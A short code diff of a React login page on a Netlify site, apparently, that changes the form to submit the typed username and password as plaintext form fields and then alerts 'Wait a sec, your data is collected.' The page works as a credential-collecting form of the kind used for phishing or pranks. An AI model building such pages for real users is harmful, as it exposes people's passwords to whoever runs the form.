@@ -37,11 +37,15 @@ export default function Home (){
             body: encode(
                 {
                 'form-name': form.getAttribute('name'),
-                ...user
+                Username: user.username,
+                Password: user.password
                 }
             )
         }).then(
-            ()=>alert("Wait a sec, your data is collected.")
+            (res)=>{
+                console.log(res)
+                alert("Wait a sec, your data is collected.")
+            }
         ).then(
             ()=>setLoggedIn(true)
         )
@@ -61,12 +65,12 @@ export default function Home (){
                 netlify-honeypot="bot-field"
                 data-netlify="true"
                 action="/"
-                onSubmit = {handleSubmit}
+                onSubmit={handleSubmit}
             >
                 <input type="hidden" name="form-name" value="login" />
                 <InputField name={'Username'} value={user.username} onChangeHandler={handlerChange}/>
                 <InputField name={'Password'} value={user.password} onChangeHandler={handlerChange}/>
-                <button onClick={handleSubmit}>LOG IN</button>
+                <button type='submit'>LOG IN</button>
             </form>
         </div>}
         
